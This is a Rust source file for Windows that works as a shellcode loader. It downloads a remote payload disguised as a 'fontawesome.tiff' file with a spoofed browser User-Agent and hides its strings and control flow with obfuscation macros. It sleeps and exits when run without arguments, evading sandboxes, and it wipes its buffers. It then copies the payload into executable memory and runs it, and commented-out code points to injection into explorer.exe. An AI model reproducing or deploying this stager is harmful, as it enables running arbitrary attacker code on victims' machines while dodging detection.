use std::ffi::{OsStr, c_void};
use std::time::Duration;
use std::{mem, ptr};

use cryptify::{self, encrypt_string, flow_stmt};
use reqwest::Error;
use windows::Win32::System::Memory::{
    MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, VirtualAlloc,
    VirtualFree, VirtualProtect,
};
use zeroize::Zeroize;

fn main() -> Result<(), Error> {
    let args: Vec<String> = std::env::args().collect();
    flow_stmt!();
    if args.len() == 1 {
        for _ in 0..10 {
            std::thread::sleep(Duration::new(3, 37));
        }
        return Ok(());
    }

    //println!("{}, {}", args[0], args[1]);
    let mut url = format!("http://{}/fontawesome.tiff", args[1]);

    let client = reqwest::blocking::Client::new();
    let req = client.get(&url)
    .header(encrypt_string!("User-Agent").as_str(), encrypt_string!("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.3").as_str());

    let res = req.send().expect("FUCK");
    let mut shellcode = res.bytes().unwrap().to_vec();

    url.zeroize();

    //println!("Downloaded shellcode: {} bytes", shellcode.len());

    //let process_name = OsStr::new("explorer.exe");
    //let pid = find_process_by_name(process_name);
    //println!("Found process: with PID: {}", pid);

    flow_stmt!();
    unsafe {
        let secure_mem = SecureMemory::new(shellcode.len()).unwrap();
        // Copy shellcode with verification
        ptr::copy_nonoverlapping(
            shellcode.as_ptr(),
            secure_mem.as_mut_ptr() as *mut u8,
            shellcode.len(),
        );
        //println!("Shellcode copied, verifying...");
        // Verify copy
        let copied_slice =
            core::slice::from_raw_parts(secure_mem.as_mut_ptr() as *const u8, shellcode.len());

        assert!(copied_slice == shellcode);
        shellcode.zeroize();

        //println!("Setting memory protection...");
        // Change protection with error handling
        let mut old_protect = PAGE_READWRITE;
        VirtualProtect(
            secure_mem.as_mut_ptr(),
            secure_mem.size,
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        )
        .unwrap();

        //println!("Executing shellcode...");
        let start_fn: unsafe extern "C" fn() -> u32 = mem::transmute(secure_mem.as_mut_ptr());
        //start_fn();
        let _exit = start_fn();
        //println!("Exit: {exit}");
    };
    Ok(())
}

/*
fn find_process_by_name(process_name: &OsStr) -> u32 {
    let sys = System::new_all();
    let pid = sys
        .processes_by_exact_name(process_name)
        .next()
        .expect(encrypt_string!("Error finding process").as_str())
        .pid();
    pid.as_u32()
}
*/

struct SecureMemory {
    ptr: *mut std::ffi::c_void,
    size: usize,
}

impl SecureMemory {
    fn new(size: usize) -> Result<Self, Box<dyn std::error::Error>> {
        // Ensure proper alignment for x64 code execution (16-byte alignment)
        let aligned_size = (size + 15) & !15;

        unsafe {
            let ptr = VirtualAlloc(None, aligned_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            //let ptr = ((ptr as usize + 15) & !15) as *mut c_void;
            if ptr.is_null() {
                return Err("Failed to allocate memory".into());
            }

            // Verify alignment
            if (ptr as usize) & 15 != 0 {
                VirtualFree(ptr, 0, MEM_RELEASE)?;
                return Err("Memory not properly aligned".into());
            }

            Ok(SecureMemory {
                ptr,
                size: aligned_size,
            })
        }
    }

    fn as_mut_ptr(&self) -> *mut std::ffi::c_void {
        self.ptr
    }
}

impl Drop for SecureMemory {
    fn drop(&mut self) {
        unsafe {
            let _ = VirtualFree(self.ptr, 0, MEM_RELEASE);
        }
    }
}
